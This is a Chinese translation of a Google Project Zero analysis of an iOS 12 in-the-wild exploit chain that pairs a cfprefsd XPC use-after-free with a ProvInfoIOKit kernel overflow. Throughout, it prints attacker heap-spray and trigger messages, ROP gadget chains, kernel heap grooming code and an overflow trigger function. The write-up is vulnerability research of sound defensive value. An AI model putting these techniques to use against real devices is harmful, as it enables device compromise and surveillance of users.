> 原文链接: https://www.anquanke.com//post/id/186262 


# 深入探索在野外发现的iOS漏洞利用链（四）


                                阅读量   
                                **450677**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者googleprojectzero，文章来源：googleprojectzero.blogspot.com
                                <br>原文地址：[https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-4.html](https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-4.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t013ea5d7d4c6cd018b.jpg)](https://p4.ssl.qhimg.com/t013ea5d7d4c6cd018b.jpg)



## 概述

这个漏洞利用链适用于iOS 12 – 12.1版本，当我们在野外发现漏洞利用链时，这两个漏洞均没有官方补丁发布。于是我们向Apple报告了这两个漏洞情况，在7天之后，iOS发布了12.1.4的更新版本。

这里的沙箱逃逸漏洞再次涉及到XPC，但这次是一个特定的守护进程错误地管理了XPC对象的生命周期。

遗憾的是，这里用到的内核漏洞非常容易被发现和被利用。带有外部方法的IOKit设备驱动程序，在第一个语句中执行包含由攻击者直接控制的长度参数的无边界memmove：

```
IOReturn
ProvInfoIOKitUserClient::ucEncryptSUInfo(char* struct_in,
                                         char* struct_out)`{`
  memmove(&amp;struct_out[4],
          &amp;struct_in[4],
          *(uint32_t*)&amp;struct_in[0x7d4]);
...
```

其中，struct_in缓冲区的内容完全由攻击者控制。

与iOS漏洞利用链#3类似，我们的测试和验证过程似乎已经能够确定这个漏洞利用链。

在本系列最后的详细介绍中，我们将了解攻击者如何利用这些漏洞来安装他们的植入工具并监视用户，以及这些恶意工具所包含的实时监控功能。



## 野外iOS漏洞利用链#4：cfprefsd + ProvInfoIOKit

目标：iPhone 5s – iPhone X，iOS 12.0 – 12.1版本（在iOS 12.1.4中修复漏洞）

iPhone6,1 (5s, N51AP)<br>
iPhone6,2 (5s, N53AP)<br>
iPhone7,1 (6 plus, N56AP)<br>
iPhone7,2 (6, N61AP)<br>
iPhone8,1 (6s, N71AP)<br>
iPhone8,2 (6s plus, N66AP)<br>
iPhone8,4 (SE, N69AP)<br>
iPhone9,1 (7, D10AP)<br>
iPhone9,2 (7 plus, D11AP)<br>
iPhone9,3 (7, D101AP)<br>
iPhone9,4 (7 plus, D111AP)<br>
iPhone10,1 (8, D20AP)<br>
iPhone10,2 (8 plus, D21AP)<br>
iPhone10,3 (X, D22AP)<br>
iPhone10,4 (8, D201AP)<br>
iPhone10,5 (8 plus, D211AP)<br>
iPhone10,6 (X, D221AP)

版本：

16A366 (12.0 – 2017年9月17日)<br>
16A404 (12.0.1 – 2018年10月8日)<br>
16B92 (12.1 – 2018年10月30日)

第一个不受支持的版本：12.1.1 – 2018年12月5日



## 开始

与iOS漏洞利用链#3一样，这个权限提升的二进制文件不依赖于系统Mach-O加载程序来解析依赖关系，而是在执行开始时解析符号。

在这里，会终止在此任务中运行的所有其他线程，然后检查其先前的漏洞利用标记。以前我们已经发现攻击者在bootargs sysctl中添加了一个字符串。而这次，他们使用了新的技术：

```
sysctl_value = 0;
  value_size = 4;
  sysctlbyname("kern.maxfilesperproc", &amp;sysctl_value, &amp;value_size, 0, 0);
  if ( sysctl_value == 0x27FF )
  `{`
    while ( 1 )
      sleep(1000LL);
  `}`
```

如果kern.maxfilesperproc的值为0x27ff，则认为此设备已被攻陷，该漏洞利用过程将停止。##再次涉及到XPC

与iOS漏洞利用链#3一样，这一条漏洞利用链具有单独的沙箱逃逸和内核漏洞利用。沙箱逃逸再次涉及到XPC，但这次不是核心XPC代码，而是守护进程错误地使用了XPC API。



## XPC中的对象生存周期管理

XPC有非常详细的使用手册，涵盖了XPC对象的生命周期语义。下面是关于$ man xpc_objects的使用方法节选：

内存管理

1、由XPC框架中的创建函数返回的对象可以分别使用函数xpc_retain()和xpc_release()统一保留和释放。

2、XPC框架不保证任何指定的客户端具有对指定对象的最终或唯一引用。对象可以由系统内部保留。

3、返回对象的函数遵循传统的create、copy和get命名规则：

（1）create返回一个带有单个引用的新对象。该引用应由调用方释放。

（2）copy返回复制或保留的对象引用。该引用应由调用方释放。

（3）get返回对现有对象的未保留引用。调用方不应释放该引用，并且如有必要，应负责保留该对象以备后续使用。

XPC对象是由引用计数。xpc_retain可以被调用以手动获取引用，并且可以使用xpc_release来删除引用。名称中带有copy的所有XPC函数都会返回一个对象，该对象具有对调用方的额外引用，而名称中带有get的XPC函数不返回额外的引用。使用手册告诉我们，如果我们调用名称中带有get的XPC函数，那么会返回对现有对象的未保留引用，且调用方无法释放该引用。接下来，我们看一个完全符合上述情况的代码案例。



## cfprefsd漏洞

com.apple.cfprefsd.daemon是由cfprefsd守护程序托管的XPC服务。该守护程序未处在沙箱之中，并且是以root身份运行，可以从应用程序沙箱和WebContent沙箱直接访问。

cfprefsd二进制文件只是一个存根（Stub），包含CoreFoundation框架中**CFXPreferencesDaemon_main的单个分支。所有代码都在CoreFoundation框架中。**

CFXPreferencesDaemon_main分配一个CFPrefsDaemon对象，该对象创建在默认并发调度队列上侦听的com.apple.cfprefsd.daemon XPC服务，为每个传入连接提供一个块来执行。这是守护进程设置代码的伪Objective-C：

```
[CFPrefsDaemon initWithRole:role testMode] `{`
  ...
  listener =
    xpc_connection_create_mach_service("com.apple.cfprefsd.daemon",
                                       0,
                                       XPC_CONNECTION_MACH_SERVICE_LISTENER);

  xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) `{`
    if (xpc_get_type(peer) == XPC_TYPE_CONNECTION) `{`
      xpc_connection_set_event_handler(peer, ^(xpc_object_t obj) `{`
        if (xpc_get_type(obj) == XPC_TYPE_DICTIONARY) `{`
          context_obj = xpc_connection_get_context(peer);
          cfprefsd = context_obj.cfprefsd;
          [cfprefsd handleMessage:obj fromPeer:peer replyHandler:
            ^(xpc_object_t reply)
            `{`
              xpc_connection_send_message(peer, reply);
            `}`];
        `}`
      `}`

      // move to a new queue:
      char label[0x80];
      pid_t pid = xpc_connection_get_pid(peer)
      dispatch_queue_t queue;
      int label_len = snprintf(label, 0x80, "Serving PID %d", pid);
      if (label_len &gt; 0x7e) `{`
        queue = NULL;
      `}` else `{`
        queue = dispatch_queue_create(label, NULL);
      `}`
      xpc_connection_set_target_queue(peer, queue);

      context_obj = [[CFPrefsClientContext alloc] init];
      context_obj.lock = 0;
      context_obj.cfprefsd = self; // the CFPrefsDaemon object
      context_obj.isPlatformBinary = -1; // char
      context_obj.valid = 1;
      xpc_connection_set_context(peer, context_obj);
      xpc_connection_set_finalizer(peer, client_context_finalizer)
      xpc_connection_resume(peer);
    `}`
  `}` 
`}`
```

该块为每个连接创建一个新的串行调度队列，并为连接上每个传入消息提供一个块。

连接上每条XPC消息最终都由[CFPrefsDaemon handleMessage:fromPeer:replyHandler:]处理：

```
-[CFPrefsDaemon handleMessage:msg fromPeer:peer replyHandler: handler] `{`
  if (xpc_get_type(msg) == XPC_TYPE_ERROR) `{`
    [self handleError:msg]
  `}` else `{`
    xpc_dictionary_get_value(msg, "connection", peer);
    uint64_t op = xpc_dictionary_get_uint64(msg, "CFPreferencesOperation");
    switch (op) `{`
     case 1:
     case 7:
     case 8:
      [self handleSourceMessage:msg replyHandler:handler];
      break;
     case 2:
      [self handleAgentCheckInMessage:msg replyHandler:handler];
      break;
     case 3:
      [self handleFlushManagedMessage:msg replyHandler:handler];
      break;
     case 4:
      [self handleFlushSourceForDomainMessage:msg replyHandler:handler];
      break;
     case 5:
      [self handleMultiMessage:msg replyHandler:handler];
      break;
     case 6:
      [self handleUserDeletedMessage:msg replyHandler:handler];
      break;
     default:
      // send error reply
    `}`
  `}`
`}`
```

handleMultiMessage是最值得关注的一个，其伪代码如下：

```
-[CFPrefsDaemon handleMultiMessage:msg replyHandler: handler]
`{`
  xpc_object_t peer = xpc_dictionary_get_remote_connection(msg);
  // ...
  xpc_object_t messages = xpc_dictionary_get_value(msg, "CFPreferencesMessages");
  if (!messages || xpc_get_type(messages) != OS_xpc_array) `{`
    // send error message
  `}`

  // may only contain dictionaries or nulls:
  bool all_types_valid = xpc_array_apply(messages, ^(xpc_object_t entry) `{`
    xpc_type_t type = xpc_get_type(entry);
    return (type == XPC_TYPE_DICTIONARY || type == XPC_TYPE_NULL)
  `}`;

  if (!all_types_valid) `{`
    // return error
  `}`

  size_t n_sub_messages = xpc_array_get_count(messages);

  // macro from CFInternal.h
  // allocates either on the stack or heap
  new_id_array(sub_messages, n_sub_messages);

  if (n_sub_messages &gt; 0) `{`
    for (size_t i = 0; i &lt; n_sub_messages; i++) `{`
      // raw pointers, not holding a reference
      sub_messages[i] = xpc_array_get_value(messages, i);
    `}`

    for (size_t i = 0; i &lt; n_sub_messages; i++) `{`
      if (xpc_get_type(sub_messages[i]) == XPC_TYPE_DICTIONARY) `{`
        [self handleMessage: sub_messages[i]
              fromPeer: peer
              replyHandler: ^(xpc_object_t reply) `{`
                sub_messages[i] = xpc_retain(reply);
              `}`];
      `}`
    `}`
  `}`

  xpc_object_t reply = xpc_dictionary_create_reply(msg);
  xpc_object_t replies_arr = xpc_array_create(sub_messages, n_sub_messages);
  xpc_dictionary_set_value(reply, "CFPreferencesMessages", replies_arr);

  xpc_release(replies_arr);

  if (n_sub_messages) `{`
    for (size_t i = 0; i &lt; n_sub_messages; i++) `{`
      if (xpc_get_type(sub_messages[i]) != XPC_TYPE_NULL) `{`
        xpc_release(sub_messages[i]);
      `}`
    `}`
  `}`

  free_id_array(sub_messages);

  handler(reply);

  xpc_release(reply);
`}`
```

multiMessage处理程序期望输入消息是xpcdictionary对象的xpc_array，它将是要处理的子消息。它使用xpc_array_get_value，将内容从xpc_array中pull出，并将其传递给handleMessage方法，使用的是另一个replyHandler块。在这里，并没有立即将回复消息发送回客户端，而是覆盖sub_messages中的输入子消息指针数组与回复。在处理完所有的子消息后，会从所有回复中创建一个xpc_array，并调用传递给此函数的replyHandler，并传递包含子消息回复的xpc_array的回复消息。

这里的漏洞有点微妙。如果我们想象没有multiMessage，那么传递给每个消息处理程序地replyHandler块的语义是：“调用我，可以发送回复”，因此名称为“replyHandler”。例如，消息类型3由handleFlushManagedMessage处理，它调用replyHandler块以返回回复。

但是，并非所有的消息类型都希望发送回复。可以把它们想象成C中的void函数，它们不会返回值。正因如此，它们也同样不会发送回复消息。这意味着它们不会调用replyHandler块。那么，如果没有回复要发送，为什么还要调用名为replyHandler的块呢？

问题在于，multiMessage改变了replyHandler块的语义。multiMessage的replyHandler块接受对回复对象的引用，并覆盖sub_messages数组中的输入消息对象：

```
for (size_t i = 0; i &lt; n_sub_messages; i++) `{`
if (xpc_get_type(sub_messages[i]) == XPC_TYPE_DICTIONARY) `{`
[self handleMessage: sub_messages[i]
fromPeer: peer
replyHandler: ^(xpc_object_t reply) `{`
sub_messages[i] = xpc_retain(reply);
`}`];
`}`
`}`
```

但是正如我们所看到的，无法保证将会调用replyHandler块。事实上，一些消息处理程序只是NOP，并且什么都不做。

这成为了一个问题，因为multiMessage replyHandler块更改了存储在sub_messages数组中的指针的生命周期语义。初始化sub_messages数组时，它存储由xpcget方法返回的原始未保留指针：

```
for (size_t i = 0; i &lt; n_sub_messages; i++) `{`
      // raw pointers, not holding a reference
      sub_messages[i] = xpc_array_get_value(messages, i);
    `}`
```

xpc_array_get_value返回xpc_array中指定偏移量处的原始指针。它不会返回包含新引用的指针。因此，在消息xpc_array的生命周期之外使用该指针是无效的。然后，replyHandler块重用sub_messages数组来存储对每个子消息的回复，但这次它需要对它存储在其中的回复对象进行引用：

```
for (size_t i = 0; i &lt; n_sub_messages; i++) `{`
      if (xpc_get_type(sub_messages[i]) == XPC_TYPE_DICTIONARY) `{`
        [self handleMessage: sub_messages[i]
              fromPeer: peer
              replyHandler: ^(xpc_object_t reply) `{`
                sub_messages[i] = xpc_retain(reply);
              `}`];
      `}`
    `}`
```

在处理完所有sub_messages后，会尝试释放所有回复：

```
if (n_sub_messages) `{`
    for (size_t i = 0; i &lt; n_sub_messages; i++) `{`
      if (xpc_get_type(sub_messages[i]) != XPC_TYPE_NULL) `{`
        xpc_release(sub_messages[i]);
      `}`
    `}`
  `}`
```

如果有一个子消息没有调用replyHandler块，那么这个循环将xpc_release输入子消息xpc_dictionary，通过xpc_array_get_value返回，而不是回复。我们知道，xpc_array_get_value不会返回引用，因此这会导致在没有引用时删除引用。由于包含请求消息的xpc_dictionary具有对子消息xpc_dictionary的唯一引用，因此xpc_release将释放子消息xpc_dictionary，在请求消息xpc_dictionary中留下悬空指针。当该字典被释放时，它将再次调用子消息字典上的xpc_release，从而使Objective-C选择器被发送到释放后的对象。



## 漏洞利用

与iOS漏洞利用链#3一样，攻击者在这里也选择了堆喷射和端口喷射技术。但是，他们没有使用资源泄露的原语，而是在XPC触发器消息本身中发送所有内容。



## 漏洞利用流

这里的漏洞利用策略是在破坏sub_messages时的xpc_release和外部请求消息的xpc_release之间的空隙中，重新分配释放后的xpc_dictionary。

攻击者通过使用并行运行的四个线程来完成此操作。线程A、B和C启动并等待全局变量设置为1。当发生这种情况时，它们各自尝试100次将以下XPC消息发送到服务：

```
`{` "CFPreferencesOperation": 5,
  "CFPreferencesMessages" : [10'000 * xpc_data_spray] `}`
```

其中xpc_data_spray是一个448字节的xpc_data缓冲区，填充qword值0x118080000。这是他们尝试堆喷射的目标地址。他们希望其中一个xpc_data的448字节后备缓冲区的内容与释放后的xpc_dictionary重叠，用堆喷射地址完全填充内存。

正如我们在[CFPrefsDaemon handleMultiMessage:replyHandler]中看到的那样，这不是一个有效的multiMessage，CFPreferencesMessage数组可能只包含字典或NULL。然而，创建所有xpc_data对象、运行handleMultiMessage、出现失败以及销毁xpc_data对象都需要一定的时间。正因如此，攻击者希望有三个线程同时进行，从而提升这个替换策略的效果。



## 触发消息

该漏洞将由子消息触发，其中操作键被映射到不会调用其回复块的处理程序。攻击者选择了操作4，由handleFlushSourceForDomainMessage处理。触发器消息如下所示：

```
`{` "CFPreferencesOperation": 5
  "CFPreferencesMessages" :
    [
      8000 * (op_1_dict, second_op_5_dict),
      150 * (second_op_5_dict, op_4_dict, op_4_dict, op_4_dict),
      third_op_5_dict
    ]
`}`
```

其中，子消息字典如下：

```
op_1_dict = `{`
  "CFPreferencesOperation": 1,
  "domain": "a",
  "A": 8_byte_xpc_data
`}`

second_op_5_dict = `{`
  "CFPreferencesOperation": 5
`}`

op_4_dict = `{`
  "CFPreferencesOperation": 4
`}`

third_op_5_dict = `{`
  "CFPreferencesOperation": 5
  "CFPreferencesMessages" : [0x2000 * xpc_send_right,
                             0x10 * xpc_data_heapspray]
`}`
```

在4k设备上，堆喷射的xpc_data对象大约为25MB，在具有更多RAM空间的16k设备上大约为30MB。攻击者将其中的16个放入消息中，在4k以及500MB的16k设备上，将导致400MB喷射虚拟地址空间。



## PC控制

线程尝试使用重复的指针值0x118080000重新填充释放后的内存。如果有效，xpc_release将在xpc_dictionary上调用，该xpc_dictionary将填充该值。

xpc_release实际上做了什么呢？Objective-C对象的第一个qword是它的isa指针。这是一个指向类对象的指针，它定义了对象的类型。在xpc_release中，他们检查libxpc的__objc_data部分中是否有isa点。如果存在，则调用os_object_release。由于攻击者提供了一个虚假的isa指针（值为0x118080000），因此将会调用另一个分支，也就是调用objc_release。如果类对象的位字段中的FAST_ALLOC位被清零（移量为0x20的字节中的第2位），就会导致释放选择器被发送到对象，将会发生下面的情况。



## 虚假选择器缓存技术

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01482be75ac3df3bfc.png)

构建一个虚假的Objective-C对象，以便在选择器被发送到它时获得PC控制，这是一种已知的技术。obj_msgSend是负责处理选择器调用的本机函数。它将首先跟随指向类对象的isa指针，然后跟随+ 0x10处的指针到选择器缓存结构，该结构是(function_pointer, selector)对的一个数组。如果目标选择器与缓存中的条目匹配，就会调用缓存的函数指针。



## 获得完全控制

在攻击者获得PC控制时，X0指向释放后的xpc_dictionary对象。在上一个也具有沙箱逃逸的利用链中，攻击者通过JOP到longjmp，可以很容易地获取栈。在iOS 12中，Apple在使用PAC的A12设备、A11设备和没有使用PAC的早期设备上加固了longjmp。攻击者的漏洞利用不支持这些设备。

下面是iOS 12中的longjmp，适用于A11及以后的设备：

```
__longjmp
MRS    X16, #3, c13, c0, #3 ; read TPIDRRO_EL0
AND    X16, X16, #0xFFFFFFFFFFFFFFF8
LDR    X16, [X16,#0x38] ; read a key from field 7
                        ; in the thread descriptor
LDP    X19, X20, [X0]
LDP    X21, X22, [X0,#0x10]
LDP    X23, X24, [X0,#0x20]
LDP    X25, X26, [X0,#0x30]
LDP    X27, X28, [X0,#0x40]
LDP    X10, X11, [X0,#0x50]
LDR    X12, [X0,#0x60]
LDP    D8, D9, [X0,#0x70]
LDP    D10, D11, [X0,#0x80]
LDP    D12, D13, [X0,#0x90]
LDP    D14, D15, [X0,#0xA0]
EOR    X29, X10, X16    ; use the key to XOR FP, LR and SP
EOR    X30, X11, X16
EOR    X12, X12, X16
MOV    SP, X12
CMP    W1, #0
CSINC  W0, W1, WZR, NE
RET
```

我们在iOS 11中查看了用于iOS漏洞利用链#3沙箱逃逸的longjmp。iOS 12中A11及以下版本的添加是从线程本地存储区读取键值，并用于对LR、SP和FP寄存器进行异或。

前三个指令是来自libsyscall的_OS_PTR_MUNGE_TOKEN宏：

```
#define _OS_PTR_MUNGE_TOKEN(_reg, _token) 
mrs _reg, TPIDRRO_EL0 %% 
and _reg, _reg, #~0x7 %% 
ldr _token, [ _reg,  #_OS_TSD_OFFSET(__TSD_PTR_MUNGE) ]
```

这是从TPIDRRO_EL0系统寄存器（只读软件线程ID寄存器）读取，XNU指向用户控件线程本地存储区域。键值通过main的特定apple[]参数传递给exec上的新进程，在exec期间生成：

```
/*
 * Supply libpthread &amp; libplatform with a random value to use for pointer
 * obfuscation.
 */
error = exec_add_entropy_key(imgp, PTR_MUNGE_KEY, PTR_MUNGE_VALUES, FALSE);
```

从根本上来说，在iOS漏洞利用链#3中使用的longjmp只是一种技术，对于漏洞利用链来说并不是什么基础。longjmp只是一种非常方便的方式来转动栈，并获得完整的寄存器控制。我们来看看攻击者是如何在没有使用longjmp的情况下转动栈的：

gadget_0将从虚假的Objective-C选择器缓存对象中读取。 X0将指向悬挂的xpc_dictionary对象，该对象被填充为0x118080000：

```
gadget_0:
LDR  X0, [X0,#0x18] ; X0 := (*(dangling_ptr+0x18)) (= 0x118080000)
LDR  X1, [X0,#0x40] ; X1 := (*(0x118080040)) (= gadget_1_addr)
BR   X1           ; jump to gadget_1
```

gadget_0为X0指向堆喷射对象，并分支到gadget_1：

```
gadget_1:
LDR  X0, [X0]       ; X0 := (*(0x118080000)) (= 0x118080040)
LDR  X4, [X0,#0x10] ; X4 = *(0x118080050) (= gadget_2_addr)
BR   X4           ; jump to gadget_2
```

gadget_1为X0获取一个新的受控值，并跳转到gadget_2：

```
gadget_2:
LDP  X8, X1, [X0,#0x20] ; X8 := *(0x118080060) (=0x1180900c0)
                        ; X1 := *(0x118080068) (=gadget_4_addr)
LDP  X2, X0, [X8,#0x20] ; X2 := *(0x1180900e0) (=gadget_3_addr)
                        ; X0 := *(0x1180900e8) (=0x118080070)
BR   X2               ; jump to gadget_3
```

gadget_2控制X0和X8并跳转到gadget_3：

```
gadget_3:
STP  X8, X1, [SP]        ; *(SP) = 0x1180900c0
                         ; *(SP+8) = gadget_4_addr
LDR  X8, [X0]            ; X8 := *(0x118080070) (=0x118080020)
LDR  X8, [X8,#0x60]      ; X8 := *(0x118080080) (=gadget_4_addr+4)
MOV  X1, SP              ; X1 := real stack
BLR  X8 ; jump to gadget 4+4
```

gadget_3将X8和X1存储到实际堆栈中，创建一个虚假栈帧，其中包含已保存帧指针（0x1180900c0）和受控返回地址（gadget_4_addr）的受控值。然后跳转到gadget_4+4：

```
gadget_4+4:
LDP X29, X30, [SP],#0x10 ; X29 := *(SP)   (=0x1180900c0)
                         ; X30 := *(SP+8) (=gadget_4_addr)
                         ; SP += 0x10
RET ; jump to LR (X30), gadget_4:
```

该过程将从实际栈中加载帧指针和链接寄存器，具体是从刚刚写入受控值的地址实现加载。这就使得攻击者可以任意控制帧指针和链接寄存器。RET会跳转到链接寄存器中的值，即gadget_4：

```
gadget_4:
MOV  SP, X29              ; SP := X29 (=0x1180900c0)
LDP  X29, X30, [SP],#0x10 ; X29 := *(0x1180900c0) (=UNINIT)
                          ; X30 := *(0x1180900c8) (gadget_5_addr)
                          ; SP += 0x10 (SP := 0x1180900d0)
RET                       ; jump to LR (X30), gadget_5
```

这会将其受控帧指针移动到栈指针寄存器中，从那里加载帧指针和链接寄存器的新值，并将RET转换为gadget_5，然后成功转动到受控栈指针中。此处的ROP栈与PE3的沙箱逃逸栈非常相似，他们使用相同的LOAD_ARGS小工具，在想要调用的每个目标函数之前加载X0-X7：

```
gadget_5: (LOAD_ARGS)
LDP   X0, X1, [SP,#0x80]
LDP   X2, X3, [SP,#0x90]
LDP   X4, X5, [SP,#0xA0]
LDP   X6, X7, [SP,#0xB0]
LDR   X8, [SP,#0xC0]
MOV   SP, X29
LDP   X29, X30, [SP],#0x10
RET
```

除此之外，还使用相同的memory_write小工具：

```
gadget_6: (MEMORY_WRITE)
LDR             X8, [SP]
STR             X0, [X8,#0x10]
LDP             X29, X30, [SP,#0x20]
ADD             SP, SP, #0x30
RET
```

有关这些小工具的ROP栈工作原理，请参阅iOS漏洞利用链#3文章。这里，是以与iOS漏洞利用链#3非常相似的方式进行，调用IOServiceMatching、IOServiceGetMatchingService和IOServiceOpen来获取一个IOKit UserClient mach端口发送权限。攻击者使用内存写入小工具将该端口名称写入他们连续发送的四个exfil消息。在WebContent进程中，在端口集上侦听消息。如果收到该消息，则会在其中发送一个ProvInfoIOKitUserClient。



## 内核漏洞

沙箱逃逸发送回与ProvInfoIOKitUserClient用户客户端类的连接，至少自iOS 10开始就一直存在。这个类通过覆盖getTargetAndMethodForIndex向用户空间公开接口，提供6个外部方法。getTargetAndMethod返回指向IOExternalMethod结构的指针，该结构描述了预期输入和输出的类型和大小。

外部方法5是ucEncryptSUInfo，它接受0x7d8字节结构输入，并返回0x7d8字节结构输出。这些大小由基础IOUserClient类的IOUserClient :: externalMethod进行验证。如果尝试传递其他大小的输入或输出，结果将会失败。

这是ProvInfoIOKitUserClient :: ucEncryptSUInfo中的第一个语句，我没有在这个函数的开头删改任何内容。struct_in指向0x7d8攻击者控制字节的缓冲区。如上面的介绍中所示：

```
IOReturn
ProvInfoIOKitUserClient::ucEncryptSUInfo(char* struct_in,
                                         char* struct_out)`{`
  memmove(&amp;struct_out[4],
          &amp;struct_in[4],
          *(uint32_t*)&amp;struct_in[0x7d4]);
...
```

IOKit外部方法类似于系统调用。这个参数在这个边界是不可信的。该外部方法中的第一个语句是一个memmove操作，具有一个简单的、由用户控制的长度参数。



## 内核漏洞利用

内核漏洞利用的开始通常都是相同的：获取设备正确的内核偏移量，并创建一个IOSurfaceRootUserClient以附加任意OSObject。攻击者分配了0x800管道（首先增加打开文件限制）和1024个早期端口。

然后，分配了768个端口，分成四组，如下所示：

```
for ( i = 0; i &lt; 192; ++i ) `{`
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;ports_a[i]);
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;ports_b[i]);
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;ports_c[i]);
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;ports_d[i]);
`}`
```

然后是另外五个独立的端口：

```
mach_port_allocate((unsigned int)mach_task_self_, 1LL,
                   &amp;port_for_more_complex_kallocer);
mach_port_allocate((unsigned int)mach_task_self_, 1LL, &amp;single_port_b);
mach_port_allocate((unsigned int)mach_task_self_, 1LL, &amp;single_port_c);
mach_port_allocate((unsigned int)mach_task_self_, 1LL, &amp;single_port_d);
mach_port_allocate((unsigned int)mach_task_self_, 1LL,
                   &amp;first_kalloc_groomer_port);
```

这里使用kalloc_groomer消息进行25600 kalloc.4096分配，然后使用与iOS漏洞利用链#3相同的技术强制GC。

在这里，分配了10240个before_ports、target_port和5120个after_ports。这也是我们在之前的链中看到的副本。初看上去，似乎正在设置一个指向target_port的悬空指针，将区域转移到kalloc.4096并构建一个虚假的内核任务端口。

随后，他们发送了一个更加复杂的kalloc_groomer，它将进行1024次kalloc.4096分配，然后进行1024次kalloc.6144分配。这填补了这两个区域的空白。

他们96次交替地将带有0x200条目的外部端口描述符发送到ports_a[]的端口，然后将kalloc.4096 groomer发送到ports_c[]的端口。

```
for ( j = 0; j &lt; 96; ++j ) `{` // use the first half of these arrays of ports
  send_ool_ports_msg(some_of_ports_a[j],
                     some_ports_to_send_ool,
                     0x200u,
                     const_15_or_8,
                     0x14u);// 15 or 8 kalloc.4096 of ool_ports
  send_kalloc_groomer_msg(some_of_ports_c[j],
                          4096,
                          stack_buf_for_kalloc_groomer,
                          1);// kalloc.4096 of ool_desc
`}`
```

内核中包含OOL_PORTS描述符的kalloc.4096如下所示：

```
+0x528 : target_port
+0x530 : target_port
+0xd28 : target_port
+0xd30 : target_port
```

在该过程中，希望可以交替使用一个空的kalloc.4096。这样一来，就得到了一个看起来类似于下面的kalloc.4096：

[![](https://p5.ssl.qhimg.com/t01181e16d42d1f3347.png)](https://p5.ssl.qhimg.com/t01181e16d42d1f3347.png)

其中，P是具有上述布局的外联端口描述符，K是来自外联内存描述符的空kalloc.4096。

然后它们交替另外96次，首先针对4104字节OSData对象，反序列化填充了ASCII “1”，同时还对一个4104字节的kalloc groomer进行反序列化。上述两个都将导致kalloc.6144的分配，因为这是kalloc.4096之后的下一个规格：

[![](https://p0.ssl.qhimg.com/t0131c27acfeadfc341.png)](https://p0.ssl.qhimg.com/t0131c27acfeadfc341.png)

这样一来，布局空间就有所改变，其中OSData后备缓冲区与kalloc.6144中空的外联内存描述符大致交替。



## 打孔过程

目前，已经破坏了kalloc.4096的中间部分，希望在一些外部端口描述符之间留出空白：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c9ae303ae0b32f83.png)

同样，攻击者会破坏kalloc.6144外联内存描述符的一半：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01cfaf65facc1d3527.png)

他们通过一个复杂的kallocer重新分配了他们刚刚释放的一半数量的24个分配，然后触发溢出：

```
__int64 __fastcall trigger_overflow(mach_port_t userclient,
                                    uint32_t bad_length)
`{`
  int64 struct_out_size;
  char struct_out[0x7d8];
  char struct_in[0x7d8];
  memset(struct_in, 'A', 0x7D8LL);
  *(uint32_t*)struct_in = 1;
  *(uint32_t*)&amp;struct_in[0x7D4] = bad_length;
  struct_out_size = 0x7D8LL;
  return IOConnectCallStructMethod(userclient,
                                   5,
                                   struct_in,
                                   0x7D8,
                                   struct_out,
                                   &amp;struct_out_size);
`}`
```

要了解这里发生了什么，我们需要更加仔细地查看外部方法调用的工作原理：

IOConnectCallStructMethod是在IOKitLib.c中实现的包装函数，IOKitLib.c是开源IOKitUser项目的一部分。它只是IOConnectCallMethod的包装器：

```
kern_return_t
IOConnectCallStructMethod(mach_port_t connection,      // In
                          uint32_t    selector,     // In
                          const void* inputStruct,     // In
                          size_t      inputStructCnt,  // In
                          void*       outputStruct,    // Out
                          size_t*     outputStructCnt) // In/Out
`{`
  return IOConnectCallMethod(connection,   selector,
                             NULL,         0,
                             inputStruct,  inputStructCnt,
                             NULL,         NULL,
                             outputStruct, outputStructCnt);
`}`
```

IOConnectCallMethod是一个更复杂的包装器，它根据传递的参数选择正确的内核MIG函数进行调用。具体而言，这里是io_connect_method：

```
rtn = io_connect_method(connection,         selector,
                        (uint64_t *) input, inputCnt,
                        inb_input,          inb_input_size,
                        ool_input,          ool_input_size,
                        inb_output,         &amp;inb_output_size,
                        output,             outputCnt,
                        ool_output,         &amp;ool_output_size);
```

IOKitLib项目不包含io_connect_method的实现，并且XNU项目也没有，那么它在哪里呢？ io_connect_method是一个MIG RPC方法，在XNU项目的device.defs文件中定义。具体定义如下：

```
routine io_connect_method (
      connection      : io_connect_t;
in    selector        : uint32_t;
in    scalar_input    : io_scalar_inband64_t;
in    inband_input    : io_struct_inband_t;
in    ool_input       : mach_vm_address_t;
in    ool_input_size  : mach_vm_size_t;

out   inband_output   : io_struct_inband_t, CountInOut;
out   scalar_output   : io_scalar_inband64_t, CountInOut;
in    ool_output      : mach_vm_address_t;
inout ool_output_size : mach_vm_size_t
);
```

